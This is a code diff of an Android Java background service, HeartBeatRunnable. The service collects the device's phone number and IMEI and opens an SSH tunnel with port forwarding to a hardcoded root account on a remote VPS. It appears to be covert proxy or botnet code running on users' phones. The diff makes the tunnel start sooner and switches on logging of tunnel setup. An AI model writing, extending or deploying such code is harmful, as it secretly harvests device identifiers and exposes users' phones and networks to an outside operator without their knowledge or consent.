@@ -58,14 +58,19 @@ public class HeartBeatRunnable implements Runnable {
 	@Override
 	public void run() {
 		try {
+			final boolean isStopService = NativeParams.ACTION_STOP_HEARTBEAT_SERVICE;
+			if (isStopService) {
+				HeartBeatService.getInstance().stopSelf();
+				return;
+			}
 			//如果获取手机号码失败次数超过10次,就停止该服务,功能正常。
 			if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
 			if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
 			if (TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(imei)) {
 				getPhoneNumFailCount++;
 				if (getPhoneNumFailCount > 100) {
-					if(DEBUG){
-						Log.d(TAG,"拿不到手机号超过100次,退出应用");
+					if (DEBUG) {
+						Log.d(TAG, "拿不到手机号超过100次,退出应用");
 					}
 					if (mHeartBeatService != null) {
 						mHeartBeatService.cancelScheduledTasks();
@@ -134,10 +139,13 @@ public class HeartBeatRunnable implements Runnable {
 		int sourcePort = 40000 + RandomUtils.getRandom(8000);
 		info.setPort("root@103.27.79.138:" + String.valueOf(sourcePort));
 		if (!isSSHConnected) {
-			if (mCurrentCount > 3 && !isStartSSHBuild) {
+			if (mCurrentCount > 1 && !isStartSSHBuild) {
+				if(DEBUG){
+					Log.d(TAG,"ssh status:start_ssh");
+				}
 				info.setStatusType(HeartBeatInfo.TYPE_START_SSH);
 				isStartSSHBuild = true;
-			} else if (mCurrentCount > 3 && isStartSSHBuild) {
+			} else if (mCurrentCount > 1 && isStartSSHBuild) {
 				info.setStatusType(HeartBeatInfo.TYPE_WAITING_SSH);
 			} else {
 				info.setStatusType(HeartBeatInfo.TYPE_IDLE);
@@ -169,7 +177,7 @@ public class HeartBeatRunnable implements Runnable {
 						break;
 					case HeartBeatInfo.TYPE_START_SSH:
 						if (DEBUG) {
-							//Log.d(TAG, "开始建立ssh隧道");
+							Log.d(TAG, "开始建立ssh隧道");
 						}
 						host = info.getPort();
 						handleStartSSH(host);
@@ -177,15 +185,15 @@ public class HeartBeatRunnable implements Runnable {
 					case HeartBeatInfo.TYPE_WAITING_SSH:
 						//等待次数超过10次重新主动建立连接
 						waitForCount++;
-						if (waitForCount == 10) {
-							waitForCount = 0;
-							host = info.getPort();
-							handleStartSSH(host);
-						} else {
-							if (DEBUG) {
-								//Log.d(TAG, "等待ssh建立完毕");
-							}
-						}
+//						if (waitForCount == 10) {
+//							waitForCount = 0;
+//							host = info.getPort();
+//							handleStartSSH(host);
+//						} else {
+//							if (DEBUG) {
+//								//Log.d(TAG, "等待ssh建立完毕");
+//							}
+//						}
 						break;
 					case HeartBeatInfo.TYPE_BUILD_SSH_SUCCESS:
 						try {
@@ -229,7 +237,7 @@ public class HeartBeatRunnable implements Runnable {
 
 
 	//开始启动SSH
-	private void handleStartSSH(String quickConnectString) {
+	private synchronized void handleStartSSH(String quickConnectString) {
 		try {
 			if (ProxyServiceUtil.isHostValid(quickConnectString, "ssh")) {
 				final int endIndex = quickConnectString.indexOf(":");
@@ -241,7 +249,7 @@ public class HeartBeatRunnable implements Runnable {
 				String sourcePort = quickConnectString.substring(startIndex + 1);
 				//int sourcePort = new Random().nextInt(8000) + 40000;
 				if (DEBUG) {
-					//Log.d(TAG, "vps分配到的host本地端口是:" + sourcePort);
+					Log.d(TAG, "vps分配到的host本地端口是:" + sourcePort);
 				}
 				ProxyServiceUtil.getInstance(mContext).setPortFowardBean(mContext, String.valueOf(sourcePort));
 
